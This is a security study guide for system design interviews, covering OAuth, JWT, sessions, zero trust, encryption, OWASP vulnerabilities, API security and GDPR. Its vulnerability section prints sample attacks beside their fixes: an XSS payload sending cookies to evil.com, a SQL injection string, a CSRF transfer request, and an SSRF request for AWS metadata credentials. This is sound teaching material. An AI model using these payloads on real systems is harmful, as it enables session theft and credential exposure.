1. Security in System Design Interviews

Why Security Is a Staff-Level Differentiator

Most candidates treat security as an afterthought — something they mention when the interviewer specifically asks about it. Staff-level candidates proactively address security throughout the design. This is one of the clearest signals of seniority.

Staff-Level Signal: Don't wait to be asked. When you describe a data flow, mention how it's authenticated. When you design an API, discuss authorization. When you store data, address encryption. Weave security into the conversation naturally.

When to Bring Up Security

Design Phase Security Consideration Example Statement
Requirements Threat modeling "Who are our adversaries? What's the blast radius if this is compromised?"
API Design AuthN/AuthZ "Every endpoint needs authentication. Let me define the authorization model."
Data Storage Encryption, PII "PII goes in a separate data store with encryption at rest and strict ACLs."
Service Communication mTLS, service identity "Services communicate over mTLS with SPIFFE-based identity."
External Integrations Input validation, SSRF "We validate and sanitize all external input. Outbound calls go through a proxy."

The STRIDE Threat Model

A useful mental framework for quickly identifying threats during an interview:

  • Spoofing — Can an attacker pretend to be someone else? (Address with authentication)
  • Tampering — Can data be modified in transit? (Address with integrity checks, TLS)
  • Repudiation — Can someone deny an action? (Address with audit logging)
  • Information Disclosure — Can data leak? (Address with encryption, access control)
  • Denial of Service — Can the system be overwhelmed? (Address with rate limiting)
  • Elevation of Privilege — Can a user gain unauthorized access? (Address with authorization)

2. Authentication vs Authorization

The Identity Pipeline

These two concepts are often confused, but the distinction is critical:

Authentication (AuthN)

"Who are you?"

  • Verifies identity
  • Happens first in the pipeline
  • Mechanisms: passwords, MFA, certificates, biometrics
  • Result: an identity token or session

Analogy: Showing your passport at the airport.

Authorization (AuthZ)

"What can you do?"

  • Determines permissions
  • Happens after authentication
  • Mechanisms: RBAC, ABAC, ACLs, policies
  • Result: allow or deny the action

Analogy: Your boarding pass determines which gate and seat.

The Identity Pipeline in a Microservices System

sequenceDiagram participant U as User participant GW as API Gateway participant IdP as Identity Provider participant AuthZ as Authorization Service participant Svc as Backend Service U->>GW: Request + Credentials GW->>IdP: Validate token / session IdP-->>GW: Identity (user ID, roles, claims) GW->>AuthZ: Can user X do action Y on resource Z? AuthZ-->>GW: Allow / Deny GW->>Svc: Forward request + identity context Svc-->>GW: Response GW-->>U: Response

Authorization Models Comparison

Model How It Works Best For Example
RBAC (Role-Based) Permissions assigned to roles; users get roles Enterprise apps, clear hierarchies Admin, Editor, Viewer
ABAC (Attribute-Based) Policies evaluate attributes of user, resource, environment Fine-grained, context-aware access "Allow if user.department == resource.department AND time is business hours"
ACL (Access Control List) Per-resource list of who can do what File systems, simple sharing Google Docs sharing list
ReBAC (Relationship-Based) Permissions derived from relationships in a graph Social networks, hierarchical orgs Google Zanzibar — used by Google Drive, YouTube
Staff-Level Signal: In interviews, mention Google Zanzibar when discussing authorization at scale. It's a relationship-based authorization system that powers Google Drive, YouTube, and Cloud IAM. It handles millions of authorization checks per second with global consistency.

3. OAuth 2.0 Deep Dive

OAuth 2.0 Flows, Tokens, and Scopes

OAuth 2.0 is the industry standard for delegated authorization. It allows a user to grant a third-party application limited access to their resources without sharing credentials. Understanding OAuth deeply is essential — it comes up in nearly every system design involving user authentication.

Key Roles in OAuth 2.0

  • Resource Owner — The user who owns the data
  • Client — The application requesting access (your app)
  • Authorization Server — Issues tokens (e.g., Google's OAuth server)
  • Resource Server — Hosts the protected API (e.g., Google Calendar API)

Authorization Code Flow (Most Common)

Used by server-side web applications. The most secure standard flow because the access token is never exposed to the browser.

sequenceDiagram participant U as User (Browser) participant App as Your App (Server) participant AS as Authorization Server participant RS as Resource Server U->>App: Click "Sign in with Google" App->>U: Redirect to AS /authorize Note over U,AS: redirect_uri, client_id, scope, state U->>AS: Login + consent AS->>U: Redirect to redirect_uri with auth code U->>App: GET /callback?code=abc123&state=xyz App->>AS: POST /token (code + client_secret) AS-->>App: access_token + refresh_token + id_token App->>RS: GET /api/data (Bearer access_token) RS-->>App: Protected resource App-->>U: Display data

Why the extra step with the authorization code? The code is exchanged server-side where the client_secret can be kept safe. If we returned the access token directly to the browser (implicit flow), it could be intercepted. This is why the implicit flow is now deprecated.

Client Credentials Flow (Service-to-Service)

Used when there is no user involved — one service authenticating to another.

# Service-to-service token exchange
POST /oauth/token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
&client_id=payment-service
&client_secret=s3cr3t
&scope=orders.read+inventory.write

The authorization server returns an access token scoped to the requested permissions. No user consent is needed because this is machine-to-machine communication.

PKCE (Proof Key for Code Exchange) for Public Clients

Mobile apps and SPAs can't safely store a client_secret. PKCE adds a dynamic secret to each authorization request:

  1. Client generates a random code_verifier (43-128 chars)
  2. Client computes code_challenge = BASE64URL(SHA256(code_verifier))
  3. Client sends code_challenge with the authorization request
  4. When exchanging the auth code, client sends the original code_verifier
  5. Authorization server verifies: SHA256(code_verifier) == code_challenge

Even if an attacker intercepts the authorization code, they can't exchange it without the code_verifier.

Token Types

Token Purpose Lifetime Storage
Access Token Authorize API requests Short (5-60 minutes) Memory (never localStorage)
Refresh Token Get new access tokens without re-login Long (days to months) Secure, HttpOnly cookie or server-side
ID Token (OIDC) Identify the user (contains claims) Short (matches access token) Validated then discarded or stored briefly

Scopes and Consent

Scopes define what the client can do. Follow the principle of least privilege:

# Bad: requesting overly broad access
scope=user.all+admin.all

# Good: request only what you need
scope=user.profile.read+user.email.read

Real Example: "Sign in with Google"

When you click "Sign in with Google" on a website:

  1. The app redirects you to accounts.google.com/o/oauth2/v2/auth
  2. You see Google's consent screen: "App X wants to access your email and profile"
  3. You click "Allow"
  4. Google redirects back with an authorization code
  5. The app's server exchanges the code for tokens (using OpenID Connect, an identity layer on top of OAuth 2.0)
  6. The ID token contains your Google user ID, email, name, and profile picture
  7. The app creates a local account or matches to an existing one
Staff-Level Signal: Distinguish between OAuth 2.0 (authorization) and OpenID Connect (authentication). OAuth alone doesn't tell you WHO the user is — it only grants access. OIDC adds the id_token which contains identity claims. When a candidate says "we use OAuth for login," clarify that you mean OIDC on top of OAuth.

4. JWT (JSON Web Tokens)

Structure, Signing, and Revocation

JWT Structure

A JWT consists of three Base64URL-encoded parts separated by dots:

eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.       <-- Header
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikpva...  <-- Payload
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   <-- Signature

Header

{
  "alg": "RS256",    // Signing algorithm
  "typ": "JWT",      // Token type
  "kid": "key-2024"  // Key ID (for key rotation)
}

Payload (Claims)

{
  "iss": "https://auth.example.com",   // Issuer
  "sub": "user-12345",                 // Subject (user ID)
  "aud": "https://api.example.com",    // Audience (intended recipient)
  "exp": 1700000000,                   // Expiration time
  "iat": 1699996400,                   // Issued at
  "nbf": 1699996400,                   // Not valid before
  "jti": "unique-token-id-abc123",     // JWT ID (for revocation)
  "roles": ["admin", "editor"],        // Custom claims
  "tenant_id": "acme-corp"             // Custom claims
}

Signature

// For RS256 (asymmetric):
RSASHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  privateKey
)

// Verification uses the PUBLIC key (can be distributed freely)

Signing Algorithms: HS256 vs RS256

Aspect HS256 (Symmetric) RS256 (Asymmetric)
Key type Shared secret (same key signs & verifies) Private key signs, public key verifies
Speed Faster Slower (RSA operations)
Key distribution Dangerous — secret must be shared with all verifiers Safe — public key can be distributed freely via JWKS endpoint
Best for Monolithic apps (single verifier) Microservices (many verifiers)
Rotation Requires coordinated secret rotation Rotate private key; publish new public key to JWKS
Staff-Level Signal: Always recommend RS256 for microservices architectures. With HS256, every service that needs to verify tokens must have the shared secret, increasing blast radius. With RS256, only the auth service has the private key; everyone else uses the public key from a JWKS (JSON Web Key Set) endpoint.

JWT Validation Flow

Pros and Cons of JWTs

Advantages

  • Stateless: No server-side session storage needed
  • Scalable: Any service can validate without a central session store
  • Cross-domain: Works across services and domains
  • Self-contained: Carries user claims, reducing DB lookups
  • Standard: Well-defined RFC 7519 with libraries in every language

Disadvantages

  • Can't revoke easily: Valid until expiration (no central session to delete)
  • Size overhead: Larger than opaque tokens (1-2 KB vs 32 bytes)
  • Stale data: Claims may be outdated if user roles change mid-session
  • Security risk if stored wrong: localStorage is vulnerable to XSS
  • Algorithm confusion attacks: Must validate alg header carefully

Token Revocation Strategies

Since JWTs are stateless, revoking them requires trade-offs:

Strategy How It Works Trade-off
Short TTL Set access tokens to expire in 5-15 minutes; use refresh tokens Simple; slight delay in revocation (up to TTL)
Token Blocklist Maintain a Redis set of revoked jti values; check on each request Immediate revocation; adds a network call (partially defeats statelessness)
Token Versioning Store a token_version per user in DB; include version in JWT; reject mismatched versions Revokes all tokens for a user at once; requires one DB lookup
Refresh Token Rotation Issue new refresh token on each use; revoke old one; detect reuse as compromise Detects token theft; adds complexity 
# Python: JWT validation with PyJWT
import jwt
from jwt import PyJWKClient

# Fetch public keys from JWKS endpoint
jwks_client = PyJWKClient("https://auth.example.com/.well-known/jwks.json")
signing_key = jwks_client.get_signing_key_from_jwt(token)

try:
    payload = jwt.decode(
        token,
        signing_key.key,
        algorithms=["RS256"],          # ALWAYS specify allowed algorithms
        audience="https://api.example.com",
        issuer="https://auth.example.com",
        options={"require": ["exp", "iss", "aud", "sub"]}
    )
    user_id = payload["sub"]
    roles = payload.get("roles", [])
except jwt.ExpiredSignatureError:
    return 401, "Token expired"
except jwt.InvalidAudienceError:
    return 401, "Invalid audience"
except jwt.InvalidTokenError:
    return 401, "Invalid token"

5. Session Management

Server-Side Sessions vs JWTs

Server-Side Sessions

The traditional approach: the server stores session data and gives the client an opaque session ID.

# Server-side session flow:
# 1. User logs in
# 2. Server creates session: Redis SET session:abc123 {user_id: 42, roles: ["admin"]}
# 3. Server sets cookie: Set-Cookie: sid=abc123; HttpOnly; Secure; SameSite=Lax
# 4. Client sends cookie on each request
# 5. Server looks up session: Redis GET session:abc123
# 6. On logout: Redis DEL session:abc123

Session Storage Options

Storage Latency Durability Scale Use Case
Redis <1ms Configurable (AOF/RDB) Cluster mode for horizontal scale Most web apps; fast TTL-based expiry
Memcached <1ms None (in-memory only) Easy horizontal scale Simple sessions; OK to lose on restart
Database 5-20ms High Depends on DB Audit requirements; need session history

Sessions vs JWTs: When to Use Which

Factor Server-Side Sessions JWTs
Revocation Instant (delete from store) Delayed or requires blocklist
Scalability Requires shared session store Stateless; no shared state
Cross-domain Difficult (cookies are domain-bound) Easy (sent in Authorization header)
Storage cost Server-side (Redis memory) Client-side (no server storage)
Best for Traditional web apps, strict security requirements Microservices, APIs, mobile apps

Session Security: Preventing Attacks

Session Fixation

Attack: Attacker sets a known session ID in the victim's browser, then waits for them to log in.

Prevention: Always regenerate the session ID after authentication.

# Python (Flask):
@app.route('/login', methods=['POST'])
def login():
    if authenticate(request.form['user'], request.form['pass']):
        session.regenerate()  # NEW session ID after login
        session['user_id'] = user.id
        return redirect('/dashboard')

Session Hijacking

Attack: Attacker steals session cookie via XSS or network sniffing.

Prevention: Secure cookie attributes:

Set-Cookie: sid=abc123;
    HttpOnly;     // JavaScript cannot read the cookie (prevents XSS theft)
    Secure;       // Only sent over HTTPS
    SameSite=Lax; // Prevents CSRF (not sent on cross-origin POST)
    Path=/;       // Cookie scope
    Max-Age=3600; // 1 hour expiry
Staff-Level Signal: In practice, most production systems use a hybrid approach. Short-lived JWTs for API authorization (5-15 min TTL) with server-side refresh token storage in Redis. This gives you the scalability of JWTs with the revocability of server-side sessions. Mention this nuance in interviews.

6. Zero Trust Architecture

Never Trust, Always Verify

Traditional security models use a perimeter-based approach: "everything inside the network is trusted." Zero Trust assumes that the network is already compromised and verifies every request regardless of where it originates.

Core Principles

  • Verify explicitly: Always authenticate and authorize based on all available data (user identity, device health, location, service identity)
  • Least privilege access: Grant just-in-time, just-enough-access (JIT/JEA)
  • Assume breach: Minimize blast radius, segment access, verify end-to-end encryption, use analytics to detect anomalies

Zero Trust Request Flow

flowchart LR subgraph Client A[User/Service] --> B[Device Health Check] end subgraph "Zero Trust Proxy" C[Identity Verification] D[Policy Engine] E[Context Evaluation] end subgraph Backend F[Service A] G[Service B] H[Database] end B --> C C --> D D --> E E -->|"mTLS + JWT"| F E -->|"mTLS + JWT"| G F -->|"mTLS"| H style D fill:#4299e1,color:#fff style E fill:#48bb78,color:#fff

Google BeyondCorp

Google's implementation of Zero Trust, published in 2014. After the Aurora attacks (2009), Google realized that VPNs and network perimeters were insufficient. BeyondCorp makes access decisions based on:

  • User identity: Who is making the request? (Strong authentication, MFA)
  • Device trust: Is the device managed? Is it patched? Does it have a valid certificate?
  • Context: Where is the request coming from? What time? What's the risk score?
  • Access policy: Does this combination of factors satisfy the policy for this resource?

Key insight: Google employees access internal apps the same way whether they're in the office or at a coffee shop. There is no VPN. Every request goes through an access proxy that makes a policy decision.

Mutual TLS (mTLS) for Service-to-Service

In standard TLS, only the server presents a certificate. In mTLS, both sides authenticate:

  1. Client connects to server
  2. Server sends its certificate — client verifies it
  3. Server requests client's certificate — server verifies it
  4. Both sides now have cryptographically verified identities
  5. Encrypted channel established

SPIFFE/SPIRE: Service Identity

SPIFFE (Secure Production Identity Framework for Everyone) provides a standard for service identity. Each service gets a SPIFFE ID: 

spiffe://example.com/payment-service
spiffe://example.com/order-service
spiffe://example.com/k8s/ns/production/sa/api-server

SPIRE is the reference implementation that issues short-lived X.509 certificates (SVIDs) to workloads. These certificates enable mTLS without managing static certificates.

Staff-Level Signal: When designing service-to-service communication, say: "We'll use mTLS with SPIFFE-based identities. Each service gets an auto-rotated short-lived certificate. Authorization policies reference SPIFFE IDs, not IP addresses, because in a dynamic container environment, IPs change constantly."

7. Encryption

At Rest, In Transit, and End-to-End

Encryption at Rest

Protects data stored on disk from physical theft or unauthorized access to storage.

Envelope Encryption (Industry Standard)

Rather than encrypting all data with a single key (risky and slow for re-encryption), envelope encryption uses a hierarchy of keys:

flowchart TD A["Root Key (in HSM)"] -->|"Encrypts"| B["Key Encryption Key (KEK)"] B -->|"Encrypts"| C["Data Encryption Key (DEK)"] C -->|"Encrypts"| D["Your Data"] E["To decrypt:"] --> F["HSM unwraps KEK"] F --> G["KEK unwraps DEK"] G --> H["DEK decrypts data"] style A fill:#e53e3e,color:#fff style B fill:#dd6b20,color:#fff style C fill:#38a169,color:#fff style D fill:#3182ce,color:#fff

Why envelope encryption?

  • Performance: Encrypt data with fast AES-256 (DEK). Only the small DEK is encrypted with the slower KMS key.
  • Key rotation: Rotate the KEK without re-encrypting all data. Just re-encrypt the DEKs.
  • Scope: Each object/record can have its own DEK, limiting blast radius.
# AWS KMS envelope encryption example (Python boto3):
import boto3
from cryptography.fernet import Fernet

kms = boto3.client('kms')

# Step 1: Generate a data encryption key
response = kms.generate_data_key(
    KeyId='alias/my-master-key',
    KeySpec='AES_256'
)
plaintext_dek = response['Plaintext']    # Use to encrypt data
encrypted_dek = response['CiphertextBlob']  # Store alongside encrypted data

# Step 2: Encrypt data with the DEK
cipher = Fernet(base64.urlsafe_b64encode(plaintext_dek))
encrypted_data = cipher.encrypt(b"sensitive data here")

# Step 3: Store encrypted_dek + encrypted_data together
# Step 4: Securely delete plaintext_dek from memory
del plaintext_dek

Encryption in Transit

TLS 1.3

TLS 1.3 is the current standard for encrypting data in transit. Improvements over TLS 1.2:

  • Faster handshake: 1-RTT (vs 2-RTT in TLS 1.2). Supports 0-RTT resumption.
  • Removed insecure ciphers: No more RSA key exchange, RC4, SHA-1, or CBC mode
  • Forward secrecy required: All cipher suites use ephemeral Diffie-Hellman
  • Encrypted handshake: Server certificate is encrypted (privacy improvement)

Certificate Management at Scale

Managing TLS certificates for thousands of services is a real operational challenge:

  • Let's Encrypt + cert-manager: Automated certificate issuance and renewal in Kubernetes
  • Internal CA: For mTLS between services, use an internal certificate authority (HashiCorp Vault, SPIRE)
  • Short-lived certificates: 24-hour certificates that auto-rotate reduce the impact of compromise

End-to-End Encryption (E2EE)

With E2EE, data is encrypted on the sender's device and decrypted only on the recipient's device. The server never sees plaintext. Used by Signal, WhatsApp, and iMessage.

The Signal Protocol:

  • Double Ratchet Algorithm: Derives new encryption keys for every message (forward secrecy + break-in recovery)
  • X3DH Key Agreement: Allows asynchronous key exchange (can send a message even if recipient is offline)
  • Sealed Sender: Even metadata (who sent the message) is hidden from the server

Key Management Best Practices

  • Never store keys in code: Use KMS (AWS KMS, GCP Cloud KMS, Azure Key Vault)
  • Rotate keys regularly: Automate rotation with zero downtime
  • Separate key management from data: The service that encrypts shouldn't manage keys
  • Audit key access: Log every key usage for compliance
  • Use HSMs for root keys: Hardware Security Modules provide tamper-evident key storage
Staff-Level Signal: In interviews, when discussing data storage, proactively say: "We'll use envelope encryption with AWS KMS. Each record gets its own DEK encrypted by a KMS-managed KEK. This gives us per-record encryption scope, fast key rotation, and compliance with SOC 2 / HIPAA requirements." This demonstrates both depth and operational awareness.

8. Common Vulnerabilities (OWASP Top 10)

What Staff Engineers Must Know

You don't need to be a penetration tester, but you must understand common attack vectors and their mitigations.

SQL Injection

Attack: Attacker injects SQL into user input that gets concatenated into a query.

# VULNERABLE:
query = f"SELECT * FROM users WHERE email = '{user_input}'"
# If user_input = "' OR '1'='1' --"
# Result: SELECT * FROM users WHERE email = '' OR '1'='1' --'
# Returns ALL users!

# SAFE: Parameterized query
cursor.execute("SELECT * FROM users WHERE email = %s", (user_input,))

# SAFE: ORM (SQLAlchemy)
user = session.query(User).filter(User.email == user_input).first()

Cross-Site Scripting (XSS)

Attack: Attacker injects JavaScript that executes in other users' browsers.

  • Stored XSS: Malicious script saved in database (e.g., in a comment), served to all viewers
  • Reflected XSS: Malicious script in URL parameter, reflected in response
  • DOM XSS: Client-side JavaScript processes untrusted data into DOM

Prevention:

<!-- VULNERABLE: -->
<div>Welcome, ${userName}</div>
<!-- If userName = <script>document.location='https://evil.com/steal?c='+document.cookie</script> -->

<!-- SAFE: Output encoding -->
<div>Welcome, ${escapeHtml(userName)}</div>

<!-- SAFE: Content Security Policy header -->
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com;
<!-- Blocks inline scripts and scripts from unauthorized domains -->

Cross-Site Request Forgery (CSRF)

Attack: Attacker tricks a logged-in user's browser into making an unintended request.

<!-- On evil.com: -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
<!-- Victim's browser sends their bank cookies automatically! -->

Prevention:

  • SameSite cookies: SameSite=Lax or SameSite=Strict prevents cookies from being sent on cross-origin requests
  • CSRF tokens: Server generates a unique token per form; validates on submission
  • Check Origin/Referer headers: Verify requests come from your domain

Server-Side Request Forgery (SSRF)

Attack: Attacker tricks the server into making requests to internal resources.

# Vulnerable endpoint that fetches a URL:
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    return requests.get(url).text

# Attacker requests:
# /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# This accesses the AWS metadata service from inside the network!

# Prevention:
# 1. Allowlist of permitted domains/IPs
# 2. Block RFC 1918 ranges (10.x, 172.16-31.x, 192.168.x) and link-local (169.254.x)
# 3. Use IMDSv2 on AWS (requires PUT with token)
# 4. Run with restricted network policies

Broken Access Control

Attack: User accesses resources or actions they shouldn't be allowed to.

# VULNERABLE: Insecure Direct Object Reference (IDOR)
@app.route('/api/invoices/<invoice_id>')
def get_invoice(invoice_id):
    return db.get_invoice(invoice_id)  # No ownership check!
    # User A can access User B's invoice by guessing the ID

# SAFE:
@app.route('/api/invoices/<invoice_id>')
@require_auth
def get_invoice(invoice_id):
    invoice = db.get_invoice(invoice_id)
    if invoice.owner_id != current_user.id:
        abort(403)  # Forbidden
    return invoice

9. API Security

Securing APIs at Scale

Rate Limiting and Throttling

Prevent abuse and protect backend services from overload:

  • Per-user limits: 100 requests/minute per authenticated user
  • Per-IP limits: For unauthenticated endpoints (login, registration)
  • Per-endpoint limits: Expensive operations get lower limits
  • Adaptive rate limiting: Tighten limits when system is under load
# Rate limit response headers (standard practice):
HTTP/1.1 429 Too Many Requests
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1699999999
Retry-After: 30

Input Validation and Sanitization

Validate on the server side. Client-side validation is for UX, not security.

# Python (Pydantic for API input validation):
from pydantic import BaseModel, EmailStr, constr, validator

class CreateUserRequest(BaseModel):
    email: EmailStr
    name: constr(min_length=1, max_length=100, pattern=r'^[a-zA-Z\s\-]+$')
    age: int

    @validator('age')
    def validate_age(cls, v):
        if not 13 <= v <= 150:
            raise ValueError('Age must be between 13 and 150')
        return v

# Rejects:
# {"email": "not-an-email", "name": "<script>alert(1)</script>", "age": -1}

API Keys vs OAuth

Aspect API Keys OAuth Tokens
Identity Identifies the application Identifies the user + application
Permissions Broad (all-or-nothing) Scoped (granular permissions)
Revocation Manual regeneration Token expiry + refresh flow
Use case Server-to-server, public APIs (Google Maps) User-context operations, delegated access
Security Lower (often leaked in client code) Higher (short-lived, scoped)

CORS (Cross-Origin Resource Sharing)

Browsers block cross-origin requests by default. CORS headers tell the browser which origins are allowed:

# Restrictive (recommended):
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 3600

# DANGEROUS - never do this in production:
Access-Control-Allow-Origin: *
# This allows ANY website to make requests to your API

Request Signing (AWS Signature V4)

For high-security APIs, sign requests to prove identity and ensure integrity:

  1. Create a canonical request string (method, path, query params, headers, payload hash)
  2. Create a string to sign (algorithm, timestamp, scope, hash of canonical request)
  3. Calculate the signature using HMAC-SHA256 with a derived signing key
  4. Add signature to the Authorization header
# AWS Signature V4 Authorization header:
Authorization: AWS4-HMAC-SHA256
  Credential=AKID/20240101/us-east-1/s3/aws4_request,
  SignedHeaders=content-type;host;x-amz-date,
  Signature=e3b0c44298fc1c149afbf4c8996fb924...

This ensures: (1) the caller has the secret key, (2) the request wasn't tampered with, and (3) the request is fresh (timestamp-based).

Staff-Level Signal: When designing a public API, mention defense in depth: "We'll use OAuth for authentication, rate limiting per user and per IP, input validation with strict schemas, request signing for sensitive operations, and CORS restricted to known client origins. For internal APIs, we add mTLS."

10. Data Privacy & Compliance

GDPR, PII Handling, and Audit Logging

GDPR Key Requirements for System Design

The General Data Protection Regulation affects how you design data storage and processing:

Right System Design Implication Implementation
Right to be Forgotten Must delete all user data on request Soft-delete with async hard-delete pipeline. Track all data locations. Challenge: data in backups, caches, analytics.
Data Portability Must export user data in machine-readable format API endpoint that generates a full export. Google Takeout is a reference implementation.
Data Minimization Collect only what's needed Design schemas with purpose limitation. Don't store "just in case" data.
Consent Explicit opt-in required Consent management system with versioned policies. Track what user consented to and when.
Breach Notification 72-hour notification window Automated breach detection, incident response runbooks, pre-drafted notification templates.

PII Handling Strategies

Tokenization

Replace sensitive data with non-sensitive tokens. The mapping is stored in a secure vault.

# Credit card tokenization:
# Real: 4532-1234-5678-9012
# Token: tok_a1b2c3d4e5f6 (random, no mathematical relationship)

# The token is safe to store in application databases, logs, and analytics.
# Only the token vault can map back to the real number.
# Used by Stripe, payment processors.

Hashing (One-Way)

# For data you need to match but never read back (passwords, SSN lookups):
import hashlib, secrets

salt = secrets.token_hex(16)
hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)

# For passwords specifically, use bcrypt or argon2:
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

Data Masking

# Show partial data for verification without exposing the full value:
email: "j***@example.com"
phone: "***-***-4567"
SSN:   "***-**-6789"
card:  "****-****-****-9012"

Every access to sensitive data must be logged for compliance:

Staff-Level Signal: When designing a system that handles PII, proactively mention: "I'd separate PII into a dedicated data store with encryption at rest, strict ACLs, and comprehensive audit logging. We'd implement tokenization so application services work with tokens instead of raw PII. For GDPR compliance, we need a data deletion pipeline that covers primary storage, backups, caches, and analytics systems."

11. Real-World Case Studies

Lessons from AWS IAM, Google BeyondCorp, and Equifax

AWS IAM at Scale

AWS Identity and Access Management handles authorization for every single AWS API call globally. Key design decisions:

  • Policy language: JSON-based policies with Effect (Allow/Deny), Action, Resource, and Condition blocks
  • Evaluation logic: Explicit Deny > Explicit Allow > Implicit Deny. This ensures that deny policies always win.
  • Policy types: Identity-based (attached to users/roles), Resource-based (attached to resources like S3 buckets), SCPs (organization-level guardrails), Permission boundaries
  • Scale: Evaluates policies on every API call. Caches policy evaluations aggressively. Eventually consistent (policy changes can take seconds to propagate).
  • Assume Role: Services and users assume temporary roles with scoped permissions. No long-lived credentials needed.
// AWS IAM Policy Example:
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "arn:aws:s3:::my-bucket/user/${aws:username}/*",
      "Condition": {
        "IpAddress": {"aws:SourceIp": "203.0.113.0/24"},
        "Bool": {"aws:MultiFactorAuthPresent": "true"}
      }
    }
  ]
}

Google BeyondCorp in Practice

Key architectural components of BeyondCorp:

  • Device Inventory Service: Tracks every device's state — OS version, patches, disk encryption, certificate validity
  • Access Proxy: All access to internal applications goes through a proxy that enforces policies
  • Access Control Engine: Evaluates policies in real-time: user identity + device trust level + context = access decision
  • Trust Levels: Devices are assigned trust tiers. Higher trust required for more sensitive applications.
  • No VPN: Internal applications are accessible from any network. The access proxy handles authentication and authorization.

Impact: Google migrated 100,000+ employees to BeyondCorp over several years. The result: employees can work from anywhere without VPN, and the security posture is stronger because every request is verified regardless of network location.

Equifax Breach (2017): Lessons Learned

One of the worst data breaches in history: 147 million people's SSNs, birth dates, and addresses exposed.

What Went Wrong

  • Unpatched vulnerability: Apache Struts CVE-2017-5638 was disclosed in March 2017. Equifax didn't patch for over 2 months.
  • No network segmentation: Once attackers got in, they could move laterally across internal systems.
  • Expired SSL certificate: A TLS inspection tool's certificate had expired 19 months earlier. Encrypted exfiltration traffic went undetected.
  • Plaintext credentials: Database credentials found in plaintext config files.
  • No encryption at rest: 147M SSNs stored unencrypted.

What Should Have Been Done

Failure Correct Practice
Unpatched software Automated vulnerability scanning, SLA for critical patches (<48 hours)
No segmentation Network segmentation, micro-segmentation, zero trust
Expired certificates Certificate monitoring and automated renewal
Plaintext credentials Secrets management (Vault, AWS Secrets Manager)
No encryption at rest Encrypt all PII with envelope encryption
Delayed detection SIEM, anomaly detection, data loss prevention (DLP)
Staff-Level Signal: Referencing real-world incidents like Equifax shows that you think about security as an operational concern, not just a theoretical one. In an interview, you might say: "We need automated vulnerability scanning with strict patch SLAs. The Equifax breach showed that a single unpatched server and lack of network segmentation can expose hundreds of millions of records."

12. Interview Cheat Sheet

Security Talking Points for System Design

Security Checklist for Any System Design

  • Authentication: "Users authenticate via OIDC. Services use mTLS with SPIFFE identities."
  • Authorization: "RBAC for user-facing features. ABAC for fine-grained resource access."
  • Encryption: "TLS 1.3 in transit. AES-256 envelope encryption at rest via KMS."
  • Input validation: "Strict schema validation on all API inputs. Parameterized queries."
  • Rate limiting: "Per-user and per-IP rate limits at the API gateway."
  • Secrets: "No hardcoded secrets. Use Vault / AWS Secrets Manager with auto-rotation."
  • Audit: "All data access logged to immutable audit trail."
  • PII: "Tokenized PII in a separate encrypted store with strict ACLs."
  • Network: "Service mesh with mTLS. Network policies for micro-segmentation."

Common Interview Follow-Up Questions

Question Strong Answer Includes
"How do you handle authentication?" OIDC for users, mTLS + SPIFFE for services, short-lived JWTs, refresh token rotation
"What if a token is compromised?" Short TTL (5-15 min), token blocklist in Redis, refresh token rotation with reuse detection
"How do you handle PII?" Separate encrypted store, tokenization, audit logging, GDPR deletion pipeline
"How do services talk to each other securely?" mTLS with SPIFFE/SPIRE, service mesh (Istio/Linkerd), zero trust — no network-based trust
"What about key management?" Cloud KMS for envelope encryption, HSM-backed root keys, automated rotation, audit trail

Red Flags to Avoid

  • Storing passwords in plaintext or MD5/SHA-1 (use bcrypt/argon2)
  • Using the implicit OAuth flow (deprecated; use Auth Code + PKCE)
  • Storing JWTs in localStorage (vulnerable to XSS; use HttpOnly cookies)
  • Trusting client-side validation as a security measure
  • Using Access-Control-Allow-Origin: * with credentials
  • Not mentioning encryption at rest for sensitive data
  • Relying solely on network perimeter for security (no zero trust thinking)

Self-Check Quiz

Suggested Flashcards

  1. Q: What is the difference between OAuth 2.0 and OpenID Connect?
    A: OAuth 2.0 is for authorization (granting access). OIDC adds authentication (identity) on top via the id_token.
  2. Q: Why is RS256 preferred over HS256 in microservices?
    A: RS256 uses asymmetric keys — only the auth service has the private key. HS256 requires sharing the secret with every verifier, increasing blast radius.
  3. Q: What is envelope encryption?
    A: Data is encrypted with a DEK; the DEK is encrypted with a KEK managed by KMS. Enables fast encryption, per-record scope, and key rotation without re-encrypting data.
  4. Q: What are the three principles of Zero Trust?
    A: Verify explicitly, use least privilege access, and assume breach.
  5. Q: How do you revoke a JWT?
    A: Short TTL (5-15 min), token blocklist (Redis), token versioning per user, or refresh token rotation with reuse detection.
